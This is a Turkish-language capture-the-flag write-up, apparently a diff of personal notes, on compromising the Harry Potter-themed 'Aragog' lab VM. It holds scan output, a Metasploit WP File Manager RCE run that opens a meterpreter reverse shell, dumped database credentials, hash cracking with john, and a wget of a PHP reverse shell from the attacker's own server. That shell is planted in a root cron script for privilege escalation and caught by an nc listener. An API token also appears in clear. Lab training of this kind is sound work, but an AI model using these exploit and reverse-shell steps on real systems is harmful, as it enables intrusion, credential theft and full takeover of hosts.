@@ -1,0 +1,489 @@
+NMAP tarama sonucları
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 11:41 +03
+Nmap scan report for wordpress.aragog.hogwarts (192.168.0.17)
+Host is up (0.00029s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+MAC Address: 08:00:27:9A:F8:78 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.48 seconds
+--------------------------------------------------------------------
+Nikto TARAMA SONUCU
+nikto -h 10.0.2.7 -o nikto_10_0_2_7.txt
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.0.2.7
++ Target Hostname:    10.0.2.7
++ Target Port:        80
++ Start Time:         2023-07-05 02:57:24 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.38 (Debian)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Server may leak inodes via ETags, header found with file /, inode: 61, size: 5bee8467b5fd6, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
++ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
++ /blog/wp-login.php: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ /blog/wp-login.php: Wordpress login found.
++ 8102 requests: 0 error(s) and 8 item(s) reported on remote host
++ End Time:           2023-07-05 02:57:40 (GMT-4) (16 seconds)
+-------------------------------------------------------------------------
+
+WPSCAN ARAMA SONUCU
+wpscan --url http://192.168.0.17/blog --force --plugins-detection aggressive --api-token ADNKCgtAc6122NqxnbgLDufTR77cCl4swS0GtaGGBsA
+TARAMA SONUCUNDA ÇOK FAZLA AÇIK BULUNUR FAKAT BURADA DİKKATİMİZİ ÇEKEN WP FİLE MANAGER UYGULAMASININ SÜRÜMÜNÜN ESKİ OLMASINDAN KAYNAKLI DOSYA 
+YÜKLENEBİLİR OLMASI. BELKİ DE BİR SHELL ATABİLİRİZ.
+
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.24
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://192.168.0.17/blog/ [192.168.0.17]
+[+] Started: Wed Jul  5 11:42:43 2023
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.38 (Debian)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://192.168.0.17/blog/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://192.168.0.17/blog/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://192.168.0.17/blog/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.0.12 identified (Insecure, released on 2021-04-15).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://192.168.0.17/blog/, Match: '-release.min.js?ver=5.0.12'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://192.168.0.17/blog/, Match: 'WordPress 5.0.12'
+
+[i] The main theme could not be detected.
+
+[+] Enumerating All Plugins (via Aggressive Methods)
+ Checking Known Locations - Time: 00:03:21 <==================> (103474 / 103474) 100.00% Time: 00:03:21
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] akismet
+ | Location: http://192.168.0.17/blog/wp-content/plugins/akismet/
+ | Latest Version: 5.2
+ | Last Updated: 2023-06-21T14:59:00.000Z
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://192.168.0.17/blog/wp-content/plugins/akismet/, status: 500
+ |
+ | The version could not be determined.
+
+[+] wp-file-manager
+ | Location: http://192.168.0.17/blog/wp-content/plugins/wp-file-manager/
+ | Last Updated: 2023-05-04T12:18:00.000Z
+ | Readme: http://192.168.0.17/blog/wp-content/plugins/wp-file-manager/readme.txt
+ | [!] The version is out of date, the latest version is 7.1.9
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://192.168.0.17/blog/wp-content/plugins/wp-file-manager/, status: 200
+ |
+ | Version: 6.0 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://192.168.0.17/blog/wp-content/plugins/wp-file-manager/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://192.168.0.17/blog/wp-content/plugins/wp-file-manager/readme.txt
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:00 <=========================> (137 / 137) 100.00% Time: 00:00:00
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Wed Jul  5 11:46:23 2023
+[+] Requests Done: 103645
+[+] Cached Requests: 8
+[+] Data Sent: 28.316 MB
+[+] Data Received: 13.924 MB
+[+] Memory used: 408.789 MB
+[+] Elapsed time: 00:03:40
+
+SONUCUNDA ESKİ SÜRÜM BULDUK
+msf6 > search CVE-2020-25213
+
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  exploit/multi/http/wp_file_manager_rce  2020-09-09       normal  Yes    WordPress File Manager Unauthenticated Remote Code Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/wp_file_manager_rce
+
+msf6 > use 0
+[*] Using configured payload php/meterpreter/reverse_tcp
+msf6 exploit(multi/http/wp_file_manager_rce) > show options
+
+Module options (exploit/multi/http/wp_file_manager_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   COMMAND    upload           yes       elFinder commands used to exploit the vulnerability (Accepted: upload, mkfile+put)
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-meta
+                                         sploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path to WordPress installation
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   WordPress File Manager 6.0-6.8
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/wp_file_manager_rce) > set LHOST 10.0.2.4
+LHOST => 10.0.2.4
+msf6 exploit(multi/http/wp_file_manager_rce) > set RHOSTS 10.0.2.7
+RHOSTS => 10.0.2.7
+msf6 exploit(multi/http/wp_file_manager_rce) > show options 
+
+Module options (exploit/multi/http/wp_file_manager_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   COMMAND    upload           yes       elFinder commands used to exploit the vulnerability (Accepted: upload, mkfile+put)
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.0.2.7         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-meta
+                                         sploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path to WordPress installation
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.2.4         yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   WordPress File Manager 6.0-6.8
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/wp_file_manager_rce) > set TARGETURI /blog
+TARGETURI => /blog
+msf6 exploit(multi/http/wp_file_manager_rce) > show options
+
+Module options (exploit/multi/http/wp_file_manager_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   COMMAND    upload           yes       elFinder commands used to exploit the vulnerability (Accepted: upload, mkfile+put)
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.0.2.7         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-meta
+                                         sploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /blog            yes       Base path to WordPress installation
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.2.4         yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   WordPress File Manager 6.0-6.8
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/wp_file_manager_rce) > run
+
+[*] Started reverse TCP handler on 10.0.2.4:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
+[*] 10.0.2.7:80 - Payload is at /blog/wp-content/plugins/wp-file-manager/lib/files/zXW9Ey.php
+[*] Sending stage (39927 bytes) to 10.0.2.7
+[+] Deleted zXW9Ey.php
+[*] Meterpreter session 1 opened (10.0.2.4:4444 -> 10.0.2.7:49412) at 2023-07-05 03:59:30 -0400
+
+meterpreter > shell
+Process 1310 created.
+Channel 0 created.
+pwd
+/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files
+cd /home
+ls
+ginny
+hagrid98
+cd ginny
+ls
+cd ..
+ls
+ginny
+hagrid98
+cd hagrid98
+ls
+horcrux1.txt
+cat horcrux1.txt
+horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
+
+-----------------------------
+horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}    RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets
+ MSFCONSOLE İLE METERPRETERE GİRDİK ARDINDAN SHELL İLE DİZİLERİ DOLAŞARAK İLK ŞİFREMİZİ BULDUK
+
+-----------------------------------------------------------------------------------------------
+ARDINDAN ETC DİZİNİNİ İZLERKEN WORDPRESS DOSYASININ İÇİNDE 
+cd wordpress
+ls
+config-default.php
+htaccess
+cat config-default.php
+<?php
+define('DB_NAME', 'wordpress');
+define('DB_USER', 'root');
+define('DB_PASSWORD', 'mySecr3tPass');
+define('DB_HOST', 'localhost');
+define('DB_COLLATE', 'utf8_general_ci');
+define('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');
+?>
+
+BİLGİLERİNE ERİŞTİK
+mysql -u root -p
+Enter password: mySecr3tPass
+use wordpress;
+select table_name from information_schema.tables;
+USE wordpress;
+SELECT table_name FROM information_schema.tables;
+ 
+KODLARI İLE VERİTABANINDAKİ TABLOLARI ELDE ETTİK
+
+SELECT table_name FROM information_schema.tables;
+
+SELECT column_name FROM information_schema.columns WHERE table_name = wp_users;
+
+ID      user_login      user_pass       user_nicename   user_email      user_url        user_registered        user_activation_key     user_status     display_name
+1       hagrid98        $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc.      wp-admin        hagrid98@localhost.local               2021-03-31 14:21:02             0       WP-Admin
+
+TABLODAN HAGRİD VE ŞİFRESİNİ BULDUK ARDINDAN BU HASH JOHN İLE ÇÖZÜMLEDİK VE ŞİFRENİN 'password123' olduğunu öğrendik.
+
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+password123      (?)     
+1g 0:00:00:00 DONE (2023-07-05 13:55) 9.090g/s 12654p/s 12654c/s 12654C/s teacher..atlanta
+Use the "--show --format=phpass" options to display all of the cracked passwords reliably
+Session completed.
+---------------------------
+
+http://192.168.0.17/blog/wp-login.php
+kullanıcı : hagrid98 
+şifre : password123
+
+şifresiyle arayüze girdik. Fakat yetkilendirme yetersiz olduğu için 404.php sayfasına shell atamadık. Bu yüzden ssh ile girip deneyeceğiz.
+------------------------------------
+SSH SUNUCUSUNDA TMP DİZİNİNDE DEĞİŞİKLİK YAPABİLDİĞİMİZİ FARK ETTİK. SHELL DOSYAMIZI BURAYA ATIP ARDINDAN OPT DOSYASINA KOPYALAYABİLİRİZ. BU NEDENLE
+KENDİ APACHE2 SUNUCUMUZU OLUŞTURUP SHELLİMİZİ ORAYA YÜKLEDİK VE ARDINDAN BUNU HAGRİD98 SSH SUNUCUSUNDAN TMP DİZİNİMİZE İNDİRDİK. ARDINDAN İNDİRDİĞİMİZ İÇİN
+OPT DİZİNİNE SHELLİN ADINI .BACKUP.SH İLE DEĞİŞTİRİP KOPYALADIK. BURADA KRİTİK NOKTA
+ BACKUP.SH DOSYASINI KENDİMİZ ÇALIŞTIRMAMALIYIZ ÇÜNKÜ BİZ ÇALIŞTIRIRSAK SHELL HAGRİD BAŞLIĞINDA ÇALIŞACAK
+KENDİ KENDİNE ROOT TARAFINDAN ÇALIŞTIRILMASINI BEKLEMELİYİZ.
+ 45 SANİYE SÜREN BEKLEME ARDINDAN ROOT TARAFINDAN BACKUP.SH DOSYASI ÇALIŞTIRILIR. BU SAYEDE SHELLİMİZ İŞE YARAMIŞ OLUR.
+ARDINDAN ROOT DİZİNİNE GİRİP LS DEDİĞİMİDE HORCRUX2 HASHİMİZE ULAŞIYORUZ.
+------------------------------------------------------------------------------------------------------
+nc -lvnp 4444
+
+------------------------------------------------------------------------------------------------------
+cd tmp
+hagrid98@Aragog:/tmp$ wget http://192.168.0.23/php-reverse-shell.txt
+--2023-07-05 17:33:24--  http://192.168.0.23/php-reverse-shell.txt
+Connecting to 192.168.0.23:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5494 (5.4K) [text/plain]
+Saving to: ‘php-reverse-shell.txt’
+
+php-reverse-shell.txt     100%[====================================>]   5.37K  --.-KB/s    in 0s      
+
+2023-07-05 17:33:24 (927 MB/s) - ‘php-reverse-shell.txt’ saved [5494/5494]
+
+cp php-reverse-shell.txt shell.php
+hagrid98@Aragog:/tmp$ echo "php /tmp/shell.php" >> /op/.backup.sh
+-bash: /op/.backup.sh: No such file or directory
+hagrid98@Aragog:/tmp$ echo "php /tmp/shell.php" >> /opt/.backup.sh
+hagrid98@Aragog:/tmp$ cd opt
+-bash: cd: opt: No such file or directory
+hagrid98@Aragog:/tmp$ cd
+hagrid98@Aragog:~$ cd opt
+-bash: cd: opt: No such file or directory
+hagrid98@Aragog:~$ cd /opt
+hagrid98@Aragog:/opt$ ls
+hagrid98@Aragog:/opt$ ls -la
+total 12
+drwxr-xr-x  2 root     root     4096 Apr  1  2021 .
+drwxr-xr-x 18 root     root     4096 Mar 31  2021 ..
+-rwxr-xr-x  1 hagrid98 hagrid98  106 Jul  5 17:34 .backup.sh
+hagrid98@Aragog:/opt$ PHP Notice:  Undefined variable: daemon in /tmp/shell.php on line 184
+ERROR: Shell connection terminated
+
+-----------------------------------------------------------------------------------------------------------------
+
+nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.0.23] from (UNKNOWN) [192.168.0.17] 44194
+Linux Aragog 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
+ 17:42:01 up  5:27,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+hagrid98 pts/0    192.168.0.23     16:38    6:08   0.16s  0.16s -bash
+uid=0(root) gid=0(root) groups=0(root)
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+# cd root
+# ls
+horcrux2.txt
+# cat horcrux2.txt
+  ____                            _         _       _   _                 
+ / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
+| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
+| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
+ \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
+                  |___/                                                   
+
+
+Machine Author: Mansoor R (@time4ster)
+Machine Difficulty: Easy
+Machine Name: Aragog 
+Horcruxes Hidden in this VM: 2 horcruxes
+
+You have successfully pwned Aragog machine.
+Here is your second hocrux: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}
+
+
+
+
+# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com
+
+# 
+echo MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU= | base64 -d
+2: maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre
+
+
+
+------------------------------------------------------------
+python3 -c "import pty;pty.spawn('/bin/bash/')" :: Shellin daha stabil çalışmasını sağladı.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
